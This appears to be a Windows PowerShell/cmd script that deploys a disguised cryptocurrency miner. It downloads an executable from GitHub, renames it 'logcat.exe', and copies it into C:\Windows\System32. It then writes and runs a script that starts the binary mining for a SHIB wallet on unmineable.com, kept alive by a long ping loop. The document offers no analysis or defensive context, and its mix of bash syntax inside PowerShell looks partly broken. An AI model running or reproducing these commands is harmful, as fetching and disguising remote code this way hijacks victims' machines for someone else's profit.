Invoke-WebRequest https://github.com/desafff/nsr/raw/main/vios.exe -OutFile logcat.exe
Copy logcat.exe C:\Windows\System32
cmd /c echo cmd /k start logcat.exe --pool rx-us.unmineable.com:3333 --username SHIB:0x1f16fe47416e8fbe038e4d6dad3dc5b720122f5e.$(shuf -i 10-99999 -n 1) --password x --algorithm wrkzcoin --disableNVIDIA >>a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
.\a.ps1
